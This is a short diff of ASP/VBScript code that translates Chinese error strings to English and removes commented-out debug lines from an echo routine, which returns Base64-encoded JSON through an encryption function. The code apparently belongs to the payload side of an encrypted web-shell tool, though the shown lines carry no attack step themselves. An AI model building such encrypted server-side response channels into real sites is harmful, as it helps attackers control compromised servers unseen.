@@ -37,7 +37,7 @@ End Function
 
 Function GetErr(Err)
 	If Err Then
-		GetErr= "<font size=2><li>错误:"&Err.Description&"</li><li>错误源:"&Err.Source&"</li><br>"
+		GetErr= "<font size=2><li>Error:"&Err.Description&"</li><li>ErrorSource:"&Err.Source&"</li><br>"
 	End If
 End Function
 Function GetStream()
@@ -82,9 +82,7 @@ End Function
 Sub echo(content)
 on error resume Next
 finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(content)&"""}"
-'Response.binarywrite(finalResult)
 Response.binarywrite(Encrypt(finalResult))
-'Response.binarywrite("aaaa")
 End Sub
 
 Sub main(arrArgs)
